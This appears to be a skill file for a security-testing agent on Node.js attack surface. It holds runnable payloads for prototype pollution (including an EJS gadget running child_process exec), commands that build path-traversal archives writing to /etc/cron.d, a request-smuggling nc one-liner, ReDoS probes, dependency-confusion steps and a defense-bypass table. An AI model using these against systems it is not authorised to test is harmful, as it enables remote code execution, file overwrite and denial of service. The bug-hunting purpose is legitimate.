---
name: nodejs
description: Node.js runtime attack surface: prototype pollution chains, npm package confusion, archive extraction traversal, sandbox escape, parser differential, crash-as-DoS
depends_on: []
---

# Node.js

Node.js runtime-level attack surface. Distinct from framework-specific skills (Express, NestJS) -- this covers the runtime itself, npm ecosystem, module loading, and patterns that apply regardless of framework. Corpus max $1.2M from archive extraction path traversal.

## Prototype Pollution Chains

The highest-value recurring Node.js vulnerability class ($10K+ payouts). Two phases: find the pollution sink, then find the gadget.

### Phase 1: Find Pollution Sinks

Enumerate input-merge sinks across the codebase:

```bash
# Grep for common deep-merge patterns
grep -rn "lodash\.merge\|lodash\.defaultsDeep\|_.merge\|_.defaultsDeep" src/
grep -rn "deepmerge\|deep-extend\|object-assign-deep\|merge-deep" src/
grep -rn "Object\.assign\|\.\.\.req\.body\|\.\.\.req\.query" src/
grep -rn "for.*in.*\|Object\.keys.*forEach" src/  # manual iteration merges
```

For each sink, trace whether attacker-controlled input flows into it:
1. `req.body` / `req.query` / `req.params` -> merge function -> target object
2. JSON.parse of user input -> spread operator -> config/options object
3. GraphQL variables -> resolver -> merge into context

### Phase 2: Find Gadgets

After polluting `Object.prototype`, find code that reads from it:

```javascript
// Common gadget patterns to grep for:
// 1. Conditional checks on undefined properties
if (obj.isAdmin) { ... }           // __proto__.isAdmin = true
if (options.shell) { ... }         // __proto__.shell = "/bin/sh"
if (config.outputDir) { ... }      // __proto__.outputDir = "/tmp/evil"

// 2. Template engines (EJS, Pug, Handlebars)
// Pollution of template options can lead to RCE
// __proto__.outputFunctionName = "x;process.mainModule.require('child_process').exec('id')//"

// 3. child_process options
// __proto__.shell = true
// __proto__.env = {NODE_OPTIONS: "--require /tmp/evil.js"}
```

### Testing Flow

```bash
# Test prototype pollution via JSON body
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Test via constructor
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# Verify pollution took effect
curl https://target.com/api/whoami  # check if isAdmin is now true
```

## npm Package Confusion

Supply chain attacks via namespace confusion in npm:

1. **Dependency confusion**: internal package name `@company/utils` has no public npm equivalent -> attacker publishes `@company/utils` on public npm with higher version -> build system installs attacker's package
2. **Typosquatting**: `lodash` vs `1odash`, `express` vs `expres`, `react` vs `reakt`
3. **Manifest confusion**: `package.json` fields (`scripts.preinstall`, `scripts.postinstall`) execute arbitrary code during `npm install`

For every target with a public repo:
```bash
# Extract internal package names
grep -rn '"@[^"]*"' package.json package-lock.json
# Check if each scoped package exists on public npm
for pkg in $(jq -r '.dependencies | keys[]' package.json | grep "^@"); do
  npm view "$pkg" 2>/dev/null || echo "NOT ON PUBLIC NPM: $pkg"
done
```

## Archive Extraction Path Traversal

Every product that accepts archive uploads (ZIP, TAR, npm tgz, Helm chart, Docker image) is a path-traversal target. Corpus max $1.2M.

```bash
# Create malicious tar with path traversal
mkdir -p evil
echo "PWNED" > evil/pwned.txt
tar cf evil.tar --transform 's|evil/pwned.txt|../../etc/cron.d/pwned|' evil/pwned.txt

# Create malicious zip
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../etc/cron.d/pwned', 'PWNED')
"

# npm tgz with crafted paths
# The 'package/' prefix is expected; escape it with ../
tar czf evil.tgz --transform 's|^|package/../../|' file.txt
```

Different package formats define metadata fields that the installer trusts. For every package manager (npm, yarn, pip, gem, composer, cargo), find the extraction code and test:
- Symlink following during extraction
- Absolute paths in archive entries
- `../` sequences in filenames
- Overlong filenames that truncate to traversal paths

## Module Loading Tricks

Node.js `require()` and dynamic `import()` have exploitable behaviors:

```javascript
// require() searches node_modules up the directory tree
// If attacker controls a directory name: write malicious index.js to a parent node_modules/

// Dynamic require with user input
const mod = require(userInput);  // path traversal: "../../etc/passwd" or "child_process"

// NODE_OPTIONS environment variable injection
// If attacker controls env vars: NODE_OPTIONS="--require /tmp/evil.js"

// Worker thread injection
// new Worker(userControlledPath) -> arbitrary code execution
```

## Crash-as-DoS

Node.js single-threaded event loop means any uncaught exception crashes the process:

```bash
# Grep for unsafe parsing in async callbacks
grep -rn "JSON\.parse(" src/ | grep -v "try"
# Any JSON.parse without try/catch in an async handler = potential DoS

# Test malformed JSON on every endpoint accepting JSON body
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"key": undefined}'
```

Also test: malformed Unicode, deeply nested objects (stack overflow), RegExp DoS (ReDoS) in validation patterns.

## SDK Credential Serialization

For any SDK that handles credentials, audit how objects serialize ($50K corpus pattern):

```javascript
// Test serialization vectors
JSON.stringify(credentialObject)    // Does it include secrets?
console.log(credentialObject)       // Does toString() leak keys?
util.inspect(credentialObject)      // Node.js inspect output?
Object.keys(credentialObject)       // Are secret fields enumerable?
```

If secrets appear in any serialization output, they will leak via error logs, debug output, and crash reports.

## HTTP Parser Differentials

Node.js HTTP parser (llhttp) vs proxy (nginx, HAProxy, CDN) creates request smuggling opportunities:

```bash
# Chunked encoding differential
printf "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc target 80

# Duplicate Transfer-Encoding headers
# Duplicate Content-Length headers
# TE + CL combination
# Malformed chunk sizes (0x prefix, +/- signs, leading zeros)
```

## Falsy Coercion Bugs

Any library/framework that disables a security check via a boolean config is vulnerable if the parser returns a falsy non-boolean:

```javascript
// Config: { csrf: false } disables CSRF protection
// But what if YAML parser returns: { csrf: "" } or { csrf: 0 }?
// "" == false is true in JS, but typeof "" !== "boolean"
// Some frameworks check `if (config.csrf === false)` (strict) vs `if (!config.csrf)` (loose)
```

Test every boolean security config with: empty string, 0, null, undefined, "false" (string), [] (empty array).

## Probe Targets

```bash
# Prototype pollution
curl -X POST https://target.com/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"test":"polluted"}}'

# Package manifest exposure
curl -s https://target.com/package.json
curl -s https://target.com/package-lock.json
curl -s https://target.com/yarn.lock
curl -s https://target.com/node_modules/.package-lock.json

# Source map exposure (may reveal server-side code)
curl -s https://target.com/main.js.map
curl -s https://target.com/app.js.map

# Error-based stack trace disclosure
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"invalid":'  # malformed JSON to trigger error

# ReDoS detection (slow response = vulnerable regex)
curl -w "%{time_total}" https://target.com/api/search?q=$(python3 -c "print('a'*50+'!')")
```

## Defense-Bypass Pairs

| Defense | Bypass | Evidence |
|---------|--------|----------|
| `__proto__` key blacklisted in body parser | Use `constructor.prototype` instead | Alternative pollution path |
| Content-Type validation requires `application/json` | Send `application/json; charset=utf-8` or `text/json` | Parser accepts variants |
| Rate limiting on Express middleware | Crash the process (DoS via uncaught exception), restart bypasses rate limit state | In-memory state lost on crash |
| npm audit in CI pipeline | Dependency confusion targets internal packages not in npm advisory DB | Private package names invisible to audit |
| Helmet.js security headers | Headers only apply to Express responses, not to static file serving or WebSocket | Partial coverage |

## Cross-References

`prototype_pollution`, `ssrf`, `path_traversal_lfi_rfi`, `http_request_smuggling`, `denial_of_service`, `supply_chain`

## Validation Requirements

- For prototype pollution: demonstrate a security-relevant gadget (privilege escalation, RCE, auth bypass), not just `__proto__` key persistence
- For package confusion: demonstrate the name collision and show that the attacker-controlled package would be installed
- For archive traversal: show file written outside intended directory
- For crash-as-DoS: demonstrate the process crash, not just an error response
- Distinguish "tech detected" from "tech vulnerable" -- many fingerprints just identify the stack
